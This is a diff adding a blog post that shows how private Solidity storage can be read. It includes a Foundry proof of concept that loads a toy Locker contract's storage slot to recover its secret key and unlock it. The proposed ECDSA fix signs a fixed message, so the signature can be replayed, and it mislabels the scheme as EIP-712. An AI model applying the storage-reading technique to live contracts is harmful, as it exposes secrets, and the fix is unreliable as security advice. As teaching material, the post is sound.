@@ -2,7 +2,137 @@
 title: Not so private Solidity storage
 date: '2023-05-09T00:00:00Z'
 modifiedTime: '2023-05-09T00:00:00Z'
-summary: Introduce private storage vulnerability,
-image: 'blogs/blockchain/reentrance/cover.webp'
+summary: Introduce private storage vulnerability. A mockup exploitation and potential solutions.
+image: 'blogs/blockchain/private_storage/cover.webp'
 type: BlogPost
 ---
+
+# Problem introduction
+
+In Solidity, you can define private variables in a contract to keep them hidden from other contracts.
+Private variables are only accessible within the contract in which they are defined and cannot be accessed
+or modified by other contracts or external users. This behavior is expected from programming languages which support OOP paradigm.
+
+However, it's important to note that private variables are still visible to all participants on the blockchain, including miners and nodes.
+This means that the values of private variables are not completely hidden,
+and should not be used to store sensitive information such as passwords or private keys.
+
+# An example
+
+We will showcase an exploitation example in Foundry-VM.
+
+## The Locker contract
+
+Let's defined a `Locker` contract with 16bytes `secretKey` as below:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+contract Locker {
+  bool public locked = true; // 1 bytes
+  bytes16 private secretKey; // 16 bytes
+
+  constructor(bytes16 _secretKey) {
+    secretKey = _secretKey;
+  }
+
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(secretKey));
+    locked = false;
+  }
+}
+
+```
+
+## Unlock
+
+If we analyze [storage allocation](https://ethereum.org/en/developers/docs/smart-contracts/anatomy/#data) of the contract above, the result is:
+
+<Image src="/blogs/blockchain/private_storage/storage.webp" width="1200" height="500" caption="Storage layout of Locker contract" />
+
+Having that information in hand, an example unlocker would perform the following step:
+
+1. Inspect the target contract
+2. Load from contract storage slot 0
+3. Extract `secretKey = bytes[15..30]` from the storage
+4. Use the secret key to unlock.
+
+An example mockup is implemented as follows:
+
+```solidity
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "~/private_lock/Locker.sol"; // the defined Locker contract
+
+contract LockerTest is Test {
+  Locker public targetLocker;
+
+  function setUp() public {
+    bytes16 secretPhrase = bytes16(keccak256(abi.encodePacked(tx.origin, "SECRET_HASH")));
+    targetLocker = new Locker(secretPhrase);
+  }
+
+  function breakSecret(Locker _targetLocker) internal view returns (bytes16) {
+    // Step 1: Identify the contract
+    address lockerAddress = address(_targetLocker);
+    // Step 2: Retrieve storage data from at block 0 from the smart contract
+    bytes32 secretDataBlock = vm.load(lockerAddress, bytes32(uint256(0)));
+
+    // LAYOUT: 15 "0" | 16 (secretKey) | 1 ("locked" status) [SLOT 0]
+    // Step 3: Retrieve byte 16th to 31th, which is the secret key.
+    bytes16 secretKey = bytes16(secretDataBlock << (15 * 8));
+
+    return secretKey;
+  }
+
+  function testUnlockLocker() public {
+    // Step 4: Unlock
+    bytes16 secretKey = breakSecret(targetLocker);
+    targetLocker.unlock(secretKey);
+
+    bool isUnlocked = !targetLocker.locked();
+    assertTrue(isUnlocked, "Hacker should break the lock");
+  }
+}
+```
+
+# Prevention
+
+A simple solution to make the contract more secured is using a pre-defined signature as the secret key.
+For this example, I use elliptic curve DSA:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+
+contract SecureLocker {
+  bool public locked = true; // 1 bytes
+  address private owner;
+  using ECDSA for bytes32;
+
+  constructor(address _owner) {
+    owner = _owner;
+  }
+
+  function unlock(bytes memory _signature) public {
+    // EIP 712 Signature Validation: https://eips.ethereum.org/EIPS/eip-712
+    bytes memory eth_msg = abi.encodePacked("\x19Ethereum Signed Message:\n20", "<SECRET_OFFCHAIN_MSG>");
+    bytes32 hash = keccak256(eth_msg);
+    if (owner == hash.recover(_signature)) {
+      locked = false;
+    }
+  }
+}
+```
+
+With this setup, the contract owner will store their signature (secret key) offchain and use it on `unlock` calls.
+
+# References
+
+1. [Ethernaut Level 12](https://ethernaut.openzeppelin.com/404)
+2. [Ethereum storage layout](https://ethereum.org/en/developers/docs/smart-contracts/anatomy/#data)
+3. [Ethereum OpCodes](https://ethereum.org/en/developers/docs/evm/opcodes/)
